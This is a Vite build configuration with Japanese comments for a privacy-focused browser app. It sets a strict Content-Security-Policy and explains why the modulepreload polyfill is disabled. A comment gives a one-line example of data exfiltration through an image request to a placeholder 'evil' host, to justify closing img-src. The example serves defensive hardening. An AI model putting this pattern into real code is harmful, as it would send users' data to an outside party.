import { defineConfig, type Plugin } from 'vite';

/**
 * Content-Security-Policy。
 *
 * この作品の中心的な約束は「画像は端末から出ません」で、CSP はそれを
 * 約束からブラウザが強制する事実へ近づけるための一段目である。
 *
 * **`connect-src 'none'` だけでは何も閉じていない。** CSP はディレクティブごとに
 * default-allow なので、`connect-src` を閉じても次の一行がそのまま通る:
 *
 *     new Image().src = 'https://evil/?p=' + data     // img-src の管轄
 *
 * ゆえに `default-src 'none'` を基点に敷き、そこから必要な分だけ開ける。
 * **`img-src` を閉じることが `connect-src 'none'` より重要**である。
 *
 * `base-uri 'none'` は非自明に load-bearing ── 注入された <base href> は全相対 URL を
 * 付け替えるので、これが開いていると `script-src 'self'` が無効化される。
 *
 * `worker-src 'self' blob:` は取り込み worker のため。vite の worker 出力形式によって
 * blob: が要るか same-origin チャンクで足りるかが変わるので、両方許している
 * (`worker.format: 'es'` を指定しているので通常は same-origin チャンク)。
 *
 * `style-src` の 'unsafe-inline' が唯一の妥協点 ── <noscript> 内の <style> と
 * インライン style 属性のため。ハッシュにすると編集のたびに壊れるので採らない。
 *
 * **CSP が原理的に塞げないもの**(README とアプリ内の声明にも書く):
 *   - トップレベルナビゲーション(`navigate-to` は CSP3 から削除され、どこにも実装がない)
 *   - window.open
 *   - WebRTC データチャネル(`webrtc 'block'` は Chromium のみ)
 * このコードはそのどれも使わないが、「使えない」のではなく「使わない」である。
 *
 * また <meta> の CSP は frame-ancestors / report-uri / sandbox を黙って無視し、
 * GitHub Pages は HTTP ヘッダを設定できない ── 埋め込み可能で、違反テレメトリも無い。
 */
const CSP = [
  "default-src 'none'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self'",
  "connect-src 'none'",
  "worker-src 'self' blob:",
  "object-src 'none'",
  "media-src 'none'",
  "manifest-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  'upgrade-insecure-requests',
].join('; ');

/**
 * 本番ビルドにだけ CSP meta を注入する。
 *
 * dev では HMR が ws: を張るので `connect-src 'none'` と両立しない。ここが罠で、
 * **プライバシー検証を `npm run dev` で行うと「CSP に阻まれた」を一度も観測できないまま
 * 素通りする**。検証は必ず `npm run preview`(:4173) で行うこと ──
 * .claude/launch.json に preview 用の設定を別に置いてあるのはそのため。
 */
function cspPlugin(): Plugin {
  return {
    name: 'lens-csp',
    apply: 'build',
    transformIndexHtml: {
      order: 'post',
      handler: (html) =>
        html.replace(
          '<head>',
          `<head>\n    <meta http-equiv="Content-Security-Policy" content="${CSP}" />`,
        ),
    },
  };
}

export default defineConfig({
  // 相対パス出力: GitHub Pages のサブパス配信(/dimension-lens/)でそのまま動く
  base: './',
  plugins: [cspPlugin()],
  // worker を same-origin の ES チャンクとして出す(blob: に頼らない)
  worker: { format: 'es' },
  build: {
    target: 'es2022',
    /**
     * modulepreload ポリフィルを無効にする。
     *
     * これは最適化の話ではなく、**プライバシーの話**である。vite の既定ポリフィルは
     * `fetch(link.href, ...)` で自前チャンクを先読みするコードをバンドルへ撒く ──
     * Phase 0 の 710 バイトのバンドルに、我々が書いていない fetch が 1 個入っていた
     * (privacy.test.ts が最初の実行で捕まえた)。
     *
     * 実害は 2 つ。(1) 「バンドルに通信 API は無い」と言えなくなる。
     * (2) `connect-src 'none'` はこの fetch も塞ぐので、ネイティブ modulepreload を
     * 持たないブラウザでは**ページを開くたびに CSP 違反が発火する** ──
     * securitypolicyviolation を購読して測るプライバシー検証(#6)が、
     * 自分の出したノイズで埋まる。
     *
     * 失うのは Safari 16.4〜16.6 などでの先読みだけで、
     * <script type="module"> によるチャンク読み込み自体は変わらない。
     * この作品は WebGL2 必須なので、対象ブラウザのほとんどはネイティブ対応済み。
     */
    modulePreload: { polyfill: false },
    // three(523KB / gzip 131KB)は exact pin のベンダーチャンク。分離したうえで閾値をその上へ。
    chunkSizeWarningLimit: 600,
    rollupOptions: {
      output: {
        manualChunks: { three: ['three'] },
      },
    },
  },
});
